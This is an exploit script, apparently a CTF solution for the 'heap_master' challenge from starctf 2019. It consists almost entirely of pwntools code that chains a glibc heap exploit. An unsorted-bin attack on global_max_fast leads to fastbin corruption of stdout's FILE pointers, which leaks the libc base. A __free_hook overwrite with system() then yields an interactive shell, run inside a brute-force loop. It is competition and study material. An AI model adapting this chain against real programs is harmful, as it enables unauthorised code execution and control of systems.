# File: exp.py
# Author: raycp
# Date: 2019-05-07
# Description: exp for heap_master

from pwn_debug.pwn_debug import *


p=""
pdbg=""
def add(size):
    p.recvuntil(">> ")
    p.sendline("1")
    p.recvuntil("size: ")
    p.sendline(str(size))

def edit(offset,size,content):
    p.recvuntil(">> ")
    p.sendline("2")
    p.recvuntil("offset: ")
    p.sendline(str(offset))
    p.recvuntil("size: ")
    p.sendline(str(size))
    p.recvuntil("content: ")
    p.send(content)


def delete(offset):
    p.recvuntil(">> ")
    p.sendline("3")
    p.recvuntil("offset: ")
    p.sendline(str(offset))

def m_add(size):
    #p.recvuntil(">> ")
    p.sendline("1")
    #p.recvuntil("size: ")
    p.sendline(str(size))

def m_edit(offset,size,content):
    #p.recvuntil(">> ")
    p.sendline("2")
    #p.recvuntil("offset: ")
    p.sendline(str(offset))
    #p.recvuntil("size: ")
    p.sendline(str(size))
    #p.recvuntil("content: ")
    p.send(content)


def m_delete(offset):
    #p.recvuntil(">> ")
    p.sendline("3")
    #p.recvuntil("offset: ")
    p.sendline(str(offset))

def pwn():
    global pdbg
    global p
    membp=pdbg.membp
    elf=pdbg.elf
    libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
    
    data=p64(0)+p64(0x21)
    edit(0,0x10,data)
    data=p64(0)+p64(0x91)
    edit(0x20,0x10,data)
    data=p64(0)+p64(0x21)
    edit(0x20+0x90,0x10,data)
    edit(0x20+0x90+0x20,0x10,data)
    

    #pdbg.bp(0xecb)
    
    delete(0x20+0x10)
    
    #guess_addr=membp.libc_base  ## use this if you're debug the program now
    ## brute guess libc address is 0xd000
    guess_addr= 0xd000
    heap_max_fast=guess_addr+libc.symbols['global_max_fast']
    fastbin_ptr=guess_addr+libc.symbols['main_arena']+8
    data=p16((heap_max_fast-0x10)&0xffff)
    ## step 1 unsorted bin attack 
    edit(0x38,2,data)
    ## overwrite global_max_fast to big value
    add(0x80)

    stdout_addr=guess_addr+libc.symbols['_IO_2_1_stdout_']
    write_base=stdout_addr+0x20
    read_end=stdout_addr+0x10
    write_ptr=stdout_addr+0x28
    write_end=stdout_addr+0x30


    ## overwrite stdout read_end to heap address
    idx=(read_end-fastbin_ptr)/8
    size=idx*0x10+0x20
    print "size1:",hex(size)
    size=0x1630
    data=p64(size+1)
    edit(0x38,8,data)
    data=p64(0)+p64(0x21)
    edit(0x30+size,0x10,data)
    delete(0x40)
    
    ## overwrite stdout write end to heap address
    idx=(write_end-fastbin_ptr)/8
    size=idx*0x10+0x20
    print "size2:",hex(size)
    size=0x1670
    data=p64(size+1)
    m_edit(0x48,8,data)
    data=p64(0)+p64(0x21)
    m_edit(0x40+size,0x10,data)
    m_delete(0x50)

    ## overwrite stdout write ptr to heap address
    idx=(write_ptr-fastbin_ptr)/8
    size=idx*0x10+0x20
    print "size3:",hex(size)
    size=0x1660
    data=p64(size+1)
    m_edit(0x48,8,data)
    data=p64(0)+p64(0x21)
    m_edit(0x40+size,0x10,data)
    m_delete(0x50)

    ## overwrite stdout write base to heap address
    idx=(write_base-fastbin_ptr)/8
    size=idx*0x10+0x20
    print "size4:",hex(size)
    size=0x1650
    data=p64(size+1)
    m_edit(0x38,8,data)
    data=p64(0)+p64(0x21)
    m_edit(0x30+size,0x10,data)
    m_delete(0x40)
    
    ## step 2 trigger printf and leak address
    libc_base=u64(p.recv(8))-libc.symbols['main_arena']-0x58
    #libc_base=u64(p.recv(8))-0x3c4b20-0x58
    log.info("leak libc base: %s"%hex(libc_base))


    #pdbg.bp([0xecb,0xf00])
    free_hook=libc_base+libc.symbols['__free_hook']
    system_addr=libc_base+libc.symbols['system']
    fastbin_ptr=libc_base+libc.symbols['main_arena']+8
    log.info("system addr: %s"%hex(system_addr))
    idx=(free_hook-fastbin_ptr)/8
    size=idx*0x10+0x20
    print hex(size)
    size=0x3920
    #print hex(size)
    data=p64(size+1)
    m_edit(0x38,8,data)
    data=p64(0)+p64(0x21)
    m_edit(0x30+size,0x10,data)
    m_delete(0x40)
    ## step 3 fastbin attack
    edit(0x40,8,p64(system_addr))
    add(0x3910)

    data='/bin/sh\x00'
    edit(0x110,8,data)
    ## step 4 get shell
    #pdbg.bp(0xecb)
    delete(0x110)
    #pdbg.bp(0xecb)
    p.recvuntil(">> offset: ")

    p.sendline("ls")
    p.interactive()


if __name__ == '__main__':
    global p 
    global pdbg
    pdbg=pwn_debug("starctf_2019_heap_master")
    # pdbg.debug("2.23")
    pdbg.context.terminal=['tmux', 'splitw', '-h']
    pdbg.local()
    while True:
        #p=pdbg.run("debug")
        #pwn()

        try:
            #p=pdbg.run("local")
            p=pdbg.run("debug")
            pwn()
        except:
            p.close()
            #pass